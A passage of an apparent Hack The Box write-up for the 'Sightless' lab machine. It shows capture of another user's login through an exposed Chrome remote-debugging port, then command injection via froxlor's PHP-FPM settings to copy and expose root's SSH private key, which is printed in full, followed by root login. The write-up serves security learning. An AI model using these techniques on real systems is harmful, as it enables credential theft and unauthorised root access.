|     0x55ed9db4b18f u003Cunknown>
|     0x55ed9dab0a18 u003Cunknown>
|     0x55ed9ddba16b u003Cunknown>
|     0x55ed9ddbe0bb u003Cunknown>
|     0x55ed9dda6281 u003Cunknown>
|     0x55ed9ddbec22 u003Cunknown>
|     0x55ed9dd8b13f u003Cunknown>
|     0x55ed9daaf027 u003Cunknown>
|_    0x7f2897e88d90 u003Cunknown>
4 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
```

- Port `8080` is running **froxlor**

> **What is froxlor**
> An open source lightweight server management software that have many vulnerabilities discovered in the past
{: .prompt-info }

#### Attempt to login

> http://240.0.0.1:8080/

- Tried some default credentials and credential stuffing, didn't succeed

![](/assets/obsidian/16f1d91c24e6ec550e6ee9bd7c2f05ec.png)

- Website config

```bash
michael@sightless:~$ ls -latr /etc/apache2/sites-enabled/
total 28
lrwxrwxrwx 1 root root   35 May 15 04:27 000-default.conf -> ../sites-available/000-default.conf
-rw-r--r-- 1 root root 1480 Aug  2 09:05 002-sqlpad.conf
drwxr-xr-x 9 root root 4096 Aug  9 11:17 ..
-rw-r--r-- 1 root root  412 Sep  3 11:55 40_froxlor_diroption_666d99c49b2986e75ed93e591b7eb6c8.conf
-rw-r--r-- 1 root root  917 Sep  3 11:55 34_froxlor_normal_vhost_web1.sightless.htb.conf
-rw-r--r-- 1 root root  770 Sep  3 11:55 10_froxlor_ipandport_192.168.1.118.80.conf
-rw-r--r-- 1 root root  264 Sep  3 11:55 05_froxlor_dirfix_nofcgid.conf
drwxr-xr-x 2 root root 4096 Sep  3 11:55 .
```

```bash
michael@sightless:~$ cat /etc/apache2/sites-enabled/05_froxlor_dirfix_nofcgid.conf

# 05_froxlor_dirfix_nofcgid.conf

# Created 03.10.2024 19:25

# Do NOT manually edit this file, all changes will be deleted after the next domain change at the panel.

  <Directory "/var/customers/webs/">
    Require all granted
    AllowOverride All
  </Directory>
```

```bash
michael@sightless:~$ cat /etc/apache2/sites-enabled/10_froxlor_ipandport_192.168.1.118.80.conf

# 10_froxlor_ipandport_192.168.1.118.80.conf

# Created 03.09.2024 11:55

# Do NOT manually edit this file, all changes will be deleted after the next domain change at the panel.

<VirtualHost 192.168.1.118:80>
DocumentRoot "/var/www/html/froxlor"
 ServerName  admin.sightless.htb
  <Directory "/lib/">
    <Files "userdata.inc.php">
    Require all denied
    </Files>
  </Directory>
  <DirectoryMatch "^/(bin|cache|logs|tests|vendor)/">
    Require all denied
  </DirectoryMatch>
  <FilesMatch \.(php)$>
    <If "-f %{SCRIPT_FILENAME}">
        SetHandler proxy:unix:/var/lib/apache2/fastcgi/1-froxlor.panel-admin.sightless.htb-php-fpm.socket|fcgi://localhost
    </If>
  </FilesMatch>
  <Directory "/var/www/html/froxlor/">
      CGIPassAuth On
  </Directory>
</VirtualHost>
```

```bash
michael@sightless:~$ cat /etc/apache2/sites-enabled/34_froxlor_normal_vhost_web1.sightless.htb.conf

# 34_froxlor_normal_vhost_web1.sightless.htb.conf

# Created 03.09.2024 11:55

# Do NOT manually edit this file, all changes will be deleted after the next domain change at the panel.


# Domain ID: 1 - CustomerID: 1 - CustomerLogin: web1
<VirtualHost 192.168.1.118:80>
  ServerName web1.sightless.htb
  ServerAlias *.web1.sightless.htb
  ServerAdmin john@sightless.htb
  DocumentRoot "/var/customers/webs/web1"
  <Directory "/var/customers/webs/web1/">
  <FilesMatch \.(php)$>
    <If "-f %{SCRIPT_FILENAME}">
      SetHandler proxy:unix:/var/lib/apache2/fastcgi/1-web1-web1.sightless.htb-php-fpm.socket|fcgi://localhost
    </If>
  </FilesMatch>
    CGIPassAuth On
    Require all granted
    AllowOverride All
  </Directory>
  Alias /goaccess "/var/customers/webs/web1/goaccess"
  LogLevel warn
  ErrorLog "/var/customers/logs/web1-error.log"
  CustomLog "/var/customers/logs/web1-access.log" combined
</VirtualHost>
```

```bash
michael@sightless:~$ cat /etc/apache2/sites-enabled/40_froxlor_diroption_666d99c49b2986e75ed93e591b7eb6c8.conf

# 40_froxlor_diroption_666d99c49b2986e75ed93e591b7eb6c8.conf

# Created 03.09.2024 11:55

# Do NOT manually edit this file, all changes will be deleted after the next domain change at the panel.

<Directory "/var/customers/webs/web1/goaccess/">
  AuthType Basic
  AuthName "Restricted Area"
  AuthUserFile /etc/apache2/froxlor-htpasswd/1-666d99c49b2986e75ed93e591b7eb6c8.htpasswd
  require valid-user
</Directory>
```

- `michael` can't access the web app files

```bash
michael@sightless:~$ find -L /var/www/html/froxlor -type f -exec ls -lahtr {} + 2>/dev/null
michael@sightless:~$ find -L /var/customers/ -type f -exec ls -lahtr {} + 2>/dev/null
-rw-r--r-- 1 www-data www-data 0 Sep  3 11:55 /var/customers/logs/web1-error.log
-rw-r--r-- 1 www-data www-data 0 Sep  3 11:55 /var/customers/logs/web1-access.log
```

### Abuse chrome remote debugger to steal credentials

- `john` have cron jobs for some kind of administration automation using chrome driver
- `/opt/google/chrome/chrome` was started with `--remote-debugging-port=0` argument, which will open up a random port when the port number is `0`
- `--remote-debugging-port` option can be abused to manipulate or monitor browser activities ([Refer](https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/chrome-remote-debugger-pentesting/))

```bash
michael@sightless:~$ ps auxfwwwww
USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root           2  0.0  0.0      0     0 ?        S    21:18   0:00 [kthreadd]
[...]
root        1220  0.0  0.0   6896  2892 ?        Ss   21:18   0:00 /usr/sbin/cron -f -P
root        1248  0.0  0.0  10344  3940 ?        S    21:18   0:00  \_ /usr/sbin/CRON -f -P
john        1268  0.0  0.0   2892   988 ?        Ss   21:18   0:00  |   \_ /bin/sh -c sleep 140 && /home/john/automation/healthcheck.sh
john        1795  0.0  0.0   7372  3524 ?        S    21:21   0:00  |       \_ /bin/bash /home/john/automation/healthcheck.sh
john       25703  0.0  0.0   5772  1016 ?        S    23:44   0:00  |           \_ sleep 60
root        1249  0.0  0.0  10344  3940 ?        S    21:18   0:00  \_ /usr/sbin/CRON -f -P
john        1265  0.0  0.0   2892   952 ?        Ss   21:18   0:00      \_ /bin/sh -c sleep 110 && /usr/bin/python3 /home/john/automation/administration.py
john        1713  0.0  0.6  33660 24692 ?        S    21:20   0:03          \_ /usr/bin/python3 /home/john/automation/administration.py
john        1714  0.2  0.3 33630172 15332 ?      Sl   21:20   0:19              \_ /home/john/automation/chromedriver --port=53341
john        1724  0.3  2.8 34011320 112144 ?     Sl   21:20   0:33              |   \_ /opt/google/chrome/chrome --allow-pre-commit-input --disable-background-networking --disable-client-side-phishing-detection --disable-default-apps --disable-dev-shm-usage --disable-hang-monitor --disable-popup-blocking --disable-prompt-on-repost --disable-sync --enable-automation --enable-logging --headless --log-level=0 --no-first-run --no-sandbox --no-service-autorun --password-store=basic --remote-debugging-port=0 --test-type=webdriver --use-mock-keychain --user-data-dir=/tmp/.org.chromium.Chromium.8EmKbs data:,
john        1731  0.0  1.4 34112448 56308 ?      S    21:20   0:00              |       \_ /opt/google/chrome/chrome --type=zygote --no-zygote-sandbox --no-sandbox --enable-logging --headless --log-level=0 --headless --crashpad-handler-pid=1727 --enable-crash-reporter
john        1748  0.2  2.9 34362344 118860 ?     Sl   21:20   0:19              |       |   \_ /opt/google/chrome/chrome --type=gpu-process --no-sandbox --disable-dev-shm-usage --headless --ozone-platform=headless --use-angle=swiftshader-webgl --headless --crashpad-handler-pid=1727 --gpu-preferences=WAAAAAAAAAAgAAAMAAAAAAAAAAAAAAAAAABgAAEAAAA4AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAGAAAAAAAAAAYAAAAAAAAAAgAAAAAAAAACAAAAAAAAAAIAAAAAAAAAA== --use-gl=angle --shared-files --fie
john        1732  0.0  1.4 34112456 56480 ?      S    21:20   0:00              |       \_ /opt/google/chrome/chrome --type=zygote --no-sandbox --enable-logging --headless --log-level=0 --headless --crashpad-handler-pid=1727 --enable-crash-reporter
john        1777  1.8  3.7 1186797428 150328 ?   Sl   21:20   2:41              |       |   \_ /opt/google/chrome/chrome --type=renderer --headless --crashpad-handler-pid=1727 --no-sandbox --disable-dev-shm-usage --enable-automation --remote-debugging-port=0 --test-type=webdriver --allow-pre-commit-input --ozone-platform=headless --disable-gpu-compositing --lang=en-US --num-raster-threads=1 --renderer-client-id=5 --time-ticks-at-unix-epoch=-1727990308433826 --launc
john        1749  0.0  2.1 33900068 85816 ?      Sl   21:20   0:08              |       \_ /opt/google/chrome/chrome --type=utility --utility-sub-type=network.mojom.NetworkService --lang=en-US --service-sandbox-type=none --no-sandbox --disable-dev-shm-usage --use-angle=swiftshader-webgl --use-gl=angle --headless --crashpad-handler-pid=1727 --shared-files=v8_context_snapshot_data:100 --field-trial-handle=3,i,18034338799215153766,13743419369118865152,262144 --disable-features=PaintHolding --variations-seed-version --enable-logging --log-level=0 --enable-crash-reporter
john        1719  0.0  0.0      0     0 ?        Z    21:20   0:00              \_ [chromedriver] <defunct>
```

- `michael` doesn't have permission to view associated process info with the ports

```bash
michael@sightless:~$ ss -ltnp
State                    Recv-Q                   Send-Q                                     Local Address:Port                                      Peer Address:Port                  Process
LISTEN                   0                        10                                             127.0.0.1:44769                                          0.0.0.0:*
LISTEN                   0                        4096                                       127.0.0.53%lo:53                                             0.0.0.0:*
LISTEN                   0                        511                                            127.0.0.1:8080                                           0.0.0.0:*
LISTEN                   0                        151                                            127.0.0.1:3306                                           0.0.0.0:*
LISTEN                   0                        4096                                           127.0.0.1:46415                                          0.0.0.0:*
LISTEN                   0                        4096                                           127.0.0.1:3000                                           0.0.0.0:*
LISTEN                   0                        5                                              127.0.0.1:53341                                          0.0.0.0:*
LISTEN                   0                        128                                              0.0.0.0:22                                             0.0.0.0:*
LISTEN                   0                        511                                              0.0.0.0:80                                             0.0.0.0:*
LISTEN                   0                        70                                             127.0.0.1:33060                                          0.0.0.0:*
LISTEN                   0                        128                                                 [::]:22                                                [::]:*
LISTEN                   0                        128                                                    *:21                                                   *:*
```

- The previous **nmap** scan result revealed a port with service : `Google Chromecast httpd`, which could be the remote debug port

```bash
44769/tcp open   http    syn-ack      Google Chromecast httpd
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
```

Start **chromium web browser** (Built-in with **burpsuite**)

Paste `chrome://inspect/#devices` in URL tab and click on `Configure`

![](/assets/obsidian/8c901e4fe7dbf63b6ce6a8ae1d30654f.png)

Add `240.0.0.1:44769`

![](/assets/obsidian/0f04df22f4b799393c37a602efd776d4.png)

The target browsers should appear in the `remote target` list. Inspect it

![](/assets/obsidian/05cbd8f86ad588b1bb228273419db0cf.png)

Use `CTRL + SHIFT + i` to open developer tools, head to network tab and wait for the user to login

![](/assets/obsidian/9be6ac954d8cf50a8371fc24bbb68c92.png)

- Got credentials

![](/assets/obsidian/65a99a5f0b461f5d115286001f7c16e5.png)

### 8080 - froxlor 2.1.8 : Admin panel to RCE

> http://240.0.0.1:8080/

- Login succeed with : `admin:ForlorfroxAdmin`

![](/assets/obsidian/1c090ab0ac48c7c14ded8c239db32d19.png)

> http://240.0.0.1:8080/admin_phpsettings.php?page=fpmdaemons

There's a function that can execute command on trigger

- PHP -> PHP-FPM versions -> Create new PHP version

![](/assets/obsidian/d62dd71ea7e2ea8d486c84cd8cb50d25.png)

- Command : `cp /root/.ssh/id_rsa /dev/shm`

![](/assets/obsidian/947256d21a40a9ba88269c6b7c5d834c.png)

After saving it, its status will be `Configuration not in use`, need to 

![](/assets/obsidian/9483703669ba652d7d7700f7e248258b.png)

> http://240.0.0.1:8080/admin_phpsettings.php?page=overview

Edit the site that's not admin panel

![](/assets/obsidian/4374fcae7c35dce671ac5bf6cab1e91f.png)

Change `PHP-FPM` config to the previously created one and save it

![](/assets/obsidian/19379470b1c77d47d3fd78053964da1e.png)

![](/assets/obsidian/41de3e6c2a8561f1c465cdba5ffe1ac7.png)

After a while, root's ssh private key was copied, but I don't have permission to view it

```bash
michael@sightless:~$ ls -latr /dev/shm/
total 4
drwxr-xr-x 20 root root 4020 Oct  3 21:18 ..
-rw-------  1 root root 3381 Oct  4 01:10 id_rsa
drwxrwxrwt  2 root root   60 Oct  4 01:10 .
```

Re-do the process again but change the command

- Command : `chmod 666 /dev/shm/id_rsa`

![](/assets/obsidian/2bc98af5e6e43af9a2f95c09a343cc08.png)

Switch the `PHP-FPM` config back to `System default` then back to `test` in order to trigger it

![](/assets/obsidian/983c4243dc9d31d1afd83620d88e38e0.png)

![](/assets/obsidian/9f6ac1400153f52778f7995076de6af7.png)

```bash
michael@sightless:~$ ls -latr /dev/shm
total 4
drwxr-xr-x 20 root root 4020 Oct  4 01:22 ..
-rw-rw-rw-  1 root root 3381 Oct  4 01:30 id_rsa
drwxrwxrwt  2 root root   60 Oct  4 01:30 .
michael@sightless:~$ cat /dev/shm/id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----
```

### 22 - SSH

```bash
┌──(bravosec㉿fsociety)-[~/htb/Sightless]
└─$ vi root.id_rsa

┌──(bravosec㉿fsociety)-[~/htb/Sightless]
└─$ chmod 600 root.id_rsa

┌──(bravosec㉿fsociety)-[~/htb/Sightless]
└─$ ssh -i root.id_rsa root@$(pt get rhost)
Warning: Permanently added 'sightless.htb' (ED25519) to the list of known hosts.
Last login: Tue Sep  3 08:18:45 2024
root@sightless:~# id
uid=0(root) gid=0(root) groups=0(root)
root@sightless:~# cat /root/root.txt
a338d114d316bb29e272519348f28707
root@sightless:~#
```

# Additional
---
